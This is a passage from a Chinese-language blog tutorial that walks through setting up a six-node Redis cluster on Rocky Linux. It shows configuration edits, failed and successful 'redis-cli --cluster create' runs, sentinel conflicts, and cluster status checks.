class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##修改基本参数</span><br><span class="hljs-built_in">bind</span> 0.0.0.0<br>masterauth=密码<br>requirepass=密码<br><br>启用集群、启用集群配置文件（记录cluster集群的主从关系等）、高可用关系<br><span class="hljs-comment"># cluster-enabled yes</span><br><span class="hljs-comment"># cluster-config-file nodes-6379.conf</span><br><span class="hljs-comment"># cluster-require-full-coverage yes</span><br><br>sed -i <span class="hljs-string">&#x27;s/#cluster-enabled yes/cluster-enabled yes/&#x27;</span> /apps/redis/etc/redis.conf<br>sed -i -e <span class="hljs-string">&#x27;s/# cluster-enabled yes/cluster-enabled yes/&#x27;</span> -e <span class="hljs-string">&#x27;s/# cluster-config-file nodes-6379.conf/cluster-config-file nodes-6379.conf/&#x27;</span> -e <span class="hljs-string">&#x27;s/# cluster-require-full-coverage yes/cluster-require-full-coverage yes/&#x27;</span> redis.conf<br><br>sed -i <span class="hljs-string">&#x27;s/cluster-enabled yes/#cluster-enabled yes/&#x27;</span> /apps/redis/etc/redis.conf<br>sed -i <span class="hljs-string">&#x27;s/cluster-enabled yes/#cluster-enabled yes/&#x27;</span> /apps/redis/etc/redis_6380.conf<br><br><br><span class="hljs-comment">##重启服务</span><br>systemctl restart redis<br>systemctl restart redis_6380<br><br>端口号为16379---&gt;cluster<br>26379---&gt;redis-sentinel哨兵<br><br>[root@rocky data]<span class="hljs-comment">#ss -ntlp | grep redis</span><br>LISTEN 0      511          0.0.0.0:6379       0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=5831,fd=6))                  <br>LISTEN 0      511          0.0.0.0:26379      0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-sentinel&quot;</span>,pid=1032,fd=6))                <br>LISTEN 0      511          0.0.0.0:16379      0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=5831,fd=10))                 <br>LISTEN 0      511            [::1]:6379          [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=5831,fd=7))                  <br>LISTEN 0      511            [::1]:16379         [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=5831,fd=11)) <br><br><span class="hljs-comment">##报错，还没规定槽位slot</span><br>127.0.0.1:6379&gt; get key<br>(error) CLUSTERDOWN Hash slot not served<br><br><span class="hljs-comment">##关于集群配置.conf，记录集群信息</span><br><span class="hljs-built_in">cat</span> /apps/redis/data<br>[root@rocky data]<span class="hljs-comment">#cat nodes-6379.conf </span><br>fdb7520fa4f0506e5b27019a880d1a8efa70dd9b :0@0 myself,master - 0 0 0 connected<br>vars currentEpoch 0 lastVoteEpoch 0<br></code></pre></td></tr></table></figure><p>报错：无法启动redis服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -f ../log/redis-6379.<span class="hljs-built_in">log</span><br><br>63581:M 28 Oct 2022 10:35:24.594 <span class="hljs-comment"># You can&#x27;t have keys in a DB different than DB 0 when in Cluster mode. Exiting.</span><br><span class="hljs-comment">##解决：删除掉rdb文件，重新生成，RDB文件不能在cluster模式下使用</span><br><br>ll /apps/redis/data<br><span class="hljs-built_in">rm</span> -rf redis.rdb<br></code></pre></td></tr></table></figure><p>执行部署cluster集群，最好在主节点上运行吧，一定要6个节点=6个服务</p><p>PS：requirepass和masterauth要一致密码</p><p>前3个为master，后3个为slave节点，自动分配主从关系的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##创建集群，</span><br>redis-cli -a 123456 --cluster create 10.0.0.132:6379 10.0.0.128:6379 10.0.0.128:6379 10.0.0.132:6380 10.0.0.128:6380 10.0.0.128:6380 --cluster-replicas 1<br><span class="hljs-built_in">cat</span> nodes-6379.conf<br><br>[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 --cluster create 10.0.0.132:6379 10.0.0.128:6379 10.0.0.128:6379 --cluster-replicas 1</span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>*** ERROR: Invalid configuration <span class="hljs-keyword">for</span> cluster creation.<br>*** Redis Cluster requires at least 3 master nodes.<br>*** This is not possible with 3 nodes and 1 replicas per node.<br>*** At least 6 nodes are required.<br><br><span class="hljs-comment">##部署slave节点，全文替换，包括port监听端口，log日志</span><br>pidfile <span class="hljs-string">&quot;/apps/redis/run/redis_6379.pid&quot;</span><br>logfile <span class="hljs-string">&quot;/apps/redis/log/redis-6379.log&quot;</span><br>port 6379<br><br><span class="hljs-built_in">cp</span> redis.conf redis_6380.conf <br><span class="hljs-built_in">cp</span> redis_6379.log redis_6380.log<br><span class="hljs-built_in">cp</span> /lib/systemd/system/redis.service /lib/systemd/system/redis_6380.service<br>sed -i <span class="hljs-string">&#x27;s/6379/6380/g&#x27;</span> /apps/redis/etc/redis_6380.conf <br>sed -i <span class="hljs-string">&#x27;s/6379/6380/g&#x27;</span> /lib/systemd/system/redis_6380.service<br><br><span class="hljs-comment">##复制到从节点</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 128 129;<span class="hljs-keyword">do</span> scp -p /apps/redis/etc/redis_6380.conf 10.0.0.<span class="hljs-variable">$i</span>:/apps/redis/etc/;<span class="hljs-keyword">done</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> 128 129;<span class="hljs-keyword">do</span> scp -p /lib/systemd/system/redis_6380.service 10.0.0.<span class="hljs-variable">$i</span>:/lib/systemd/system/;<span class="hljs-keyword">done</span><br><br><span class="hljs-comment">##修改权限，服务启动</span><br><span class="hljs-built_in">chown</span> redis.redis -R /apps/redis<br>systemctl <span class="hljs-built_in">enable</span> --now redis_6380<br><br>[root@rocky system]<span class="hljs-comment">#ss -ntlp | grep 6380</span><br>LISTEN 0      511          0.0.0.0:6380       0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=7266,fd=6))                   <br>LISTEN 0      511          0.0.0.0:16380      0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=7266,fd=10))                  <br>LISTEN 0      511            [::1]:6380          [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=7266,fd=7))                   <br>LISTEN 0      511            [::1]:16380         [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=7266,fd=11)) <br></code></pre></td></tr></table></figure><h3 id="cluster服务fail，和哨兵sentinel冲突了，杀掉哨兵"><a href="#cluster服务fail，和哨兵sentinel冲突了，杀掉哨兵" class="headerlink" title="cluster服务fail，和哨兵sentinel冲突了，杀掉哨兵"></a>cluster服务fail，和哨兵sentinel冲突了，杀掉哨兵</h3><p>发现一定要6个节点，不然一定会失败，跟sentinel哨兵服务冲突了，杀掉</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##停止哨兵模式sentinel服务</span><br>systemctl <span class="hljs-built_in">disable</span> --now redis-sentinel.service<br>ps aux | grep sentinel<br>ss -ntlp | grep 63<br>[root@rocky data]<span class="hljs-comment">#ss -ntlp | grep 63</span><br>LISTEN 0      511          0.0.0.0:6379       0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=1052,fd=6))                  <br>LISTEN 0      511          0.0.0.0:6380       0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=2204,fd=6))                  <br>LISTEN 0      5          127.0.0.1:631        0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;cupsd&quot;</span>,pid=1066,fd=10))                        <br>LISTEN 0      511          0.0.0.0:16379      0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=1052,fd=10))                 <br>LISTEN 0      511          0.0.0.0:16380      0.0.0.0:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=2204,fd=10))                 <br>LISTEN 0      511            [::1]:6379          [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=1052,fd=7))                  <br>LISTEN 0      511            [::1]:6380          [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=2204,fd=7))                  <br>LISTEN 0      5              [::1]:631           [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;cupsd&quot;</span>,pid=1066,fd=9))                         <br>LISTEN 0      511            [::1]:16379         [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=1052,fd=11))                 <br>LISTEN 0      511            [::1]:16380         [::]:*    <span class="hljs-built_in">users</span>:((<span class="hljs-string">&quot;redis-server&quot;</span>,pid=2204,fd=11))    <br><br>---------------------------------------------------------------------------------------------------------------------<br><span class="hljs-comment">##部署</span><br><br>[root@rocky ~]<span class="hljs-comment">#redis-cli -a 123456 --cluster create 10.0.0.132:6379 10.0.0.128:6379 10.0.0.128:6379 10.0.0.132:6380 10.0.0.128:6380 10.0.0.128:6380 --cluster-replicas 1</span><br><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>&gt;&gt;&gt; Performing <span class="hljs-built_in">hash</span> slots allocation on 6 nodes...<br>Master[0] -&gt; Slots 0 - 5460<br>Master[1] -&gt; Slots 5461 - 10922<br>Master[2] -&gt; Slots 10923 - 16383<br>Adding replica 10.0.0.128:6380 to 10.0.0.132:6379<br>Adding replica 10.0.0.128:6380 to 10.0.0.128:6379<br>Adding replica 10.0.0.128:6379 to 10.0.0.132:6380<br><br>&gt;&gt;&gt; Trying to optimize slaves allocation <span class="hljs-keyword">for</span> anti-affinity<br>[WARNING] Some slaves are <span class="hljs-keyword">in</span> the same host as their master<br>M: fdb7520fa4f0506e5b27019a880d1a8efa70dd9b 10.0.0.132:6379<br>   slots:[0-5460] (5461 slots) master<br>M: 7746303b83d2943e2e6edac5fd3bdaed37f419b8 10.0.0.128:6379<br>   slots:[5461-10922] (5462 slots) master<br>S: 7746303b83d2943e2e6edac5fd3bdaed37f419b8 10.0.0.128:6379<br>   replicates fdb7520fa4f0506e5b27019a880d1a8efa70dd9b<br>M: 0e12c385b246460651ea3c1b247f20e029da2a28 10.0.0.132:6380<br>   slots:[10923-16383] (5461 slots) master<br>S: 993a95fb5e5454e48050d997872ca57e1fe703d6 10.0.0.128:6380<br>   replicates 7746303b83d2943e2e6edac5fd3bdaed37f419b8<br>S: 993a95fb5e5454e48050d997872ca57e1fe703d6 10.0.0.128:6380<br>   replicates 0e12c385b246460651ea3c1b247f20e029da2a28<br><br>Can I <span class="hljs-built_in">set</span> the above configuration? (<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;yes&#x27;</span> to accept): <span class="hljs-built_in">yes</span><br>&gt;&gt;&gt; Nodes configuration updated<br>&gt;&gt;&gt; Assign a different config epoch to each node<br>&gt;&gt;&gt; Sending CLUSTER MEET messages to <span class="hljs-built_in">join</span> the cluster<br>Failed to send CLUSTER MEET <span class="hljs-built_in">command</span>.<br><br>--------------------------------------------------------------------------------------------------------------------<br><br>[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 --cluster create 10.0.0.132:6379 10.0.0.128:6379 10.0.0.128:6379 10.0.0.132:6380 10.0.0.128:6380 10.0.0.128:6380 --cluster-replicas 1</span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>&gt;&gt;&gt; Performing <span class="hljs-built_in">hash</span> slots allocation on 6 nodes...<br>Master[0] -&gt; Slots 0 - 5460<br>Master[1] -&gt; Slots 5461 - 10922<br>Master[2] -&gt; Slots 10923 - 16383<br>Adding replica 10.0.0.128:6380 to 10.0.0.132:6379<br>Adding replica 10.0.0.128:6380 to 10.0.0.128:6379<br>Adding replica 10.0.0.128:6379 to 10.0.0.132:6380<br>&gt;&gt;&gt; Trying to optimize slaves allocation <span class="hljs-keyword">for</span> anti-affinity<br>[WARNING] Some slaves are <span class="hljs-keyword">in</span> the same host as their master<br>M: fdb7520fa4f0506e5b27019a880d1a8efa70dd9b 10.0.0.132:6379<br>   slots:[0-5460] (5461 slots) master<br>M: 7746303b83d2943e2e6edac5fd3bdaed37f419b8 10.0.0.128:6379<br>   slots:[5461-10922] (5462 slots) master<br>S: 7746303b83d2943e2e6edac5fd3bdaed37f419b8 10.0.0.128:6379<br>   replicates 7746303b83d2943e2e6edac5fd3bdaed37f419b8<br>M: 0e12c385b246460651ea3c1b247f20e029da2a28 10.0.0.132:6380<br>   slots:[10923-16383] (5461 slots) master<br>S: 993a95fb5e5454e48050d997872ca57e1fe703d6 10.0.0.128:6380<br>   replicates 0e12c385b246460651ea3c1b247f20e029da2a28<br>S: 993a95fb5e5454e48050d997872ca57e1fe703d6 10.0.0.128:6380<br>   replicates fdb7520fa4f0506e5b27019a880d1a8efa70dd9b<br>Can I <span class="hljs-built_in">set</span> the above configuration? (<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;yes&#x27;</span> to accept): <span class="hljs-built_in">yes</span><br>&gt;&gt;&gt; Nodes configuration updated<br>&gt;&gt;&gt; Assign a different config epoch to each node<br>&gt;&gt;&gt; Sending CLUSTER MEET messages to <span class="hljs-built_in">join</span> the cluster<br>Waiting <span class="hljs-keyword">for</span> the cluster to <span class="hljs-built_in">join</span><br><br>&gt;&gt;&gt; Performing Cluster Check (using node 10.0.0.132:6379)<br>M: fdb7520fa4f0506e5b27019a880d1a8efa70dd9b 10.0.0.132:6379<br>   slots:[0-5460] (5461 slots) master<br>   1 additional replica(s)<br>M: 7746303b83d2943e2e6edac5fd3bdaed37f419b8 10.0.0.128:6379<br>   slots:[5461-10922] (5462 slots) master<br>S: 993a95fb5e5454e48050d997872ca57e1fe703d6 10.0.0.128:6380<br>   slots: (0 slots) slave<br>   replicates fdb7520fa4f0506e5b27019a880d1a8efa70dd9b<br>M: 0e12c385b246460651ea3c1b247f20e029da2a28 10.0.0.132:6380<br>   slots:[10923-16383] (5461 slots) master<br>[OK] All nodes agree about slots configuration.<br>&gt;&gt;&gt; Check <span class="hljs-keyword">for</span> open slots...<br>&gt;&gt;&gt; Check slots coverage...<br>[OK] All 16384 slots covered.<br><br><span class="hljs-comment">##重建集群</span><br>redis-cli -a 123456 --cluster create 10.0.0.132:6379 10.0.0.128:6379 10.0.0.129:6379 10.0.0.132:6380 10.0.0.128:6380 10.0.0.129:6380 --cluster-replicas 1<br></code></pre></td></tr></table></figure><p><img src="2792175-20221210172436126-1856402553.png" alt="img"></p><h2 id="重建cluster集群"><a href="#重建cluster集群" class="headerlink" title="重建cluster集群"></a>重建cluster集群</h2><p>1.发现原集群的配置有点问题，已经无法修改</p><p>2.删除掉data/node.conf，每个端口的都要删除，rm -rf /apps/redis/data/node*</p><p>3.重新启动redis服务，每个端口都要重启</p><p>systemctl restart redis</p><p>systemctl restart redis_6380</p><p>4.重新create集群</p><p>5.验证集群</p><p>在集群模式下运行命令：-c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 cluster nodes</span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>7746303b83d2943e2e6edac5fd3bdaed37f419b8 10.0.0.128:6379@16379 master - 0 1666940261773 2 connected 5461-10922<br>0e12c385b246460651ea3c1b247f20e029da2a28 10.0.0.132:6380@16380 master - 0 1666940260763 4 connected 10923-16383<br>fdb7520fa4f0506e5b27019a880d1a8efa70dd9b 10.0.0.132:6379@16379 myself,master - 0 1666940258000 1 connected 0-5460<br><br><br><span class="hljs-comment">##redis集群基本操作</span><br>[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 cluster nodes</span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>0e12c385b246460651ea3c1b247f20e029da2a28 10.0.0.132:6380@16380 master - 0 1666946147938 4 connected 10923-16383<br>7746303b83d2943e2e6edac5fd3bdaed37f419b8 10.0.0.128:6379@16379 master - 0 1666946148946 2 connected 5461-10922<br>fdb7520fa4f0506e5b27019a880d1a8efa70dd9b 10.0.0.132:6379@16379 myself,master - 0 1666946146000 1 connected 0-5460<br><br>redis-cli -a 123456 --cluster create 10.0.0.132:6379 10.0.0.128:6379 10.0.0.129:6379 10.0.0.132:6380 10.0.0.128:6380 10.0.0.129:6380 --cluster-replicas 1<br><br>redis-cli -a 123456 --cluster reshard 10.0.0.132:6380 <br>redis-cli -a 123456 --cluster del-node 10.0.0.132:6380 0e12c385b246460651ea3c1b247f20e029da2a28<br><br><span class="hljs-built_in">rm</span> -rf /apps/redis/data/node*<br>systemctl restart redis<br>systemctl restart redis_6380<br><br>[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 --cluster create 10.0.0.132:6379 10.0.0.128:6379 10.0.0.129:6379 10.0.0.132:6380 10.0.0.128:6380 10.0.0.129:6380 --cluster-replicas 1</span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>&gt;&gt;&gt; Performing <span class="hljs-built_in">hash</span> slots allocation on 6 nodes...<br>Master[0] -&gt; Slots 0 - 5460<br>Master[1] -&gt; Slots 5461 - 10922<br>Master[2] -&gt; Slots 10923 - 16383<br>Adding replica 10.0.0.128:6380 to 10.0.0.132:6379<br>Adding replica 10.0.0.129:6380 to 10.0.0.128:6379<br>Adding replica 10.0.0.132:6380 to 10.0.0.129:6379<br></code></pre></td></tr></table></figure><h2 id="查看cluster集群的状态"><a href="#查看cluster集群的状态" class="headerlink" title="查看cluster集群的状态"></a>查看cluster集群的状态</h2><p>阿里云redis：直接直连到redis的域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##主从关系，所有6379都是master节点</span><br>Adding replica 10.0.0.128:6380 to 10.0.0.132:6379<br>Adding replica 10.0.0.129:6380 to 10.0.0.128:6379<br>Adding replica 10.0.0.132:6380 to 10.0.0.129:6379<br><br>master主节点，slave从节点，myself当前节点<br><span class="hljs-comment">##查看集群node状态</span><br>[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 cluster nodes</span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>9cfa2df2729dc59ceb1a8cc087643dccadea4369 10.0.0.128:6379@16379 master - 0 1666947107569 2 connected 5461-10922<br>208f0bbc3d6f2297f8700f2a6c024da86a918938 10.0.0.132:6379@16379 myself,master - 0 1666947105000 1 connected 0-5460<br>ed9353a0af64b76a0681a152db87f430f8ac8849 10.0.0.128:6380@16380 slave 208f0bbc3d6f2297f8700f2a6c024da86a918938 0 1666947107000 1 connected<br>ca80dc10f4581d0e051a9e23aeffa8426cc32166 10.0.0.132:6380@16380 slave 8845e2d632180388c415959bfe85b50eee7f3b10 0 1666947108000 3 connected<br>0ba024bd1b2bd91d16c38f90e5d03b75f73b393f 10.0.0.129:6380@16380 slave 9cfa2df2729dc59ceb1a8cc087643dccadea4369 0 1666947108579 2 connected<br>8845e2d632180388c415959bfe85b50eee7f3b10 10.0.0.129:6379@16379 master - 0 1666947107000 3 connected 10923-16383<br><br><br><span class="hljs-comment">##查看单个节点的主从状态</span><br>redis-cli -a 123456 -c info replication<br>[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 -c info replication</span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br><span class="hljs-comment"># Replication</span><br>role:master<br>connected_slaves:1<br>slave0:ip=10.0.0.128,port=6380,state=online,offset=364,lag=0<br><br>每一个主节点master都有一个从节点slave<br><br><br><span class="hljs-comment">##查看集群状态info</span><br>[root@rocky data]<span class="hljs-comment">#redis-cli -a 123456 cluster info </span><br>Warning: Using a password with <span class="hljs-string">&#x27;-a&#x27;</span> or <span class="hljs-string">&#x27;-u&#x27;</span> option on the <span class="hljs-built_in">command</span> line interface may not be safe.<br>cluster_state:ok<br>cluster_slots_assigned:16384<br>cluster_slots_ok:16384<br>cluster_slots_pfail:0<br>cluster_slots_fail:0<br>cluster_known_nodes:6 <span class="hljs-comment">##6节点，包括3主3从</span><br>cluster_size:3 <span class="hljs-comment">##集群规模：3个</span><br>cluster_current_epoch:6<br>cluster_my_epoch:1<br>cluster_stats_messages_ping_sent:362<br>cluster_stats_messages_pong_sent:341<br>cluster_stats_messages_sent:703<br>cluster_stats_messages_ping_received:336<br>cluster_stats_messages_pong_received:362<br>cluster_stats_messages_meet_received:5<br>cluster_stats_messages_received:703<br><br>[root@rocky data]<span class="hljs-comment">#cat nodes-6379.conf </span><br>9cfa2df2729dc59ceb1a8cc087643dccadea4369 10.0.0.128:6379@16379 master - 0 1666946953301 2 connected 5461-10922<br>208f0bbc3d6f2297f8700f2a6c024da86a918938 10.0.0.132:6379@16379 myself,master - 0 1666946953000 1 connected 0-5460<br>ed9353a0af64b76a0681a152db87f430f8ac8849 10.0.0.128:6380@16380 slave 208f0bbc3d6f2297f8700f2a6c024da86a918938 0 1666946954309 1 connected<br>ca80dc10f4581d0e051a9e23aeffa8426cc32166 10.0.0.132:6380@16380 slave 8845e2d632180388c415959bfe85b50eee7f3b10 0 1666946952292 3 connected<br>0ba024bd1b2bd91d16c38f90e5d03b75f73b393f 10.0.0.129:6380@16380 slave 9cfa2df2729dc59ceb1a8cc087643dccadea4369 0 1666946953000 2 connected<br>8845e2d632180388c415959bfe85b50eee7f3b10 10.0.0.129:6379@16379 master - 0 1666946953000 3 connected 10923-16383<br></code></pre></td></tr></table></figure><h2 id="集群故障转移"><a href="#集群故障转移" class="headerlink" title="集群故障转移"></a>集群故障转移</h2><p>1.主节点master节点坏了，则从节点提升为主节点，数据同步过去</p><p>2.主节点master修复后，成为新主的从节点</p><p>3.集群内的数据不受影响，任何一个节点都以slot的方式来存储，分片存储，3个master节点都可以进行读写</p><h2 id="测试写入数据key及python写入测试"><a href="#测试写入数据key及python写入测试" class="headerlink" title="测试写入数据key及python写入测试"></a>测试写入数据key及python写入测试</h2><p>直接-c自动判断重定向到对应node上面的slot槽位，以集群的模式启动redis集群</p><p>python，java等程序估计都是要写入redis所有节点的IP地址+端口号的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -a 123456 --cluster create 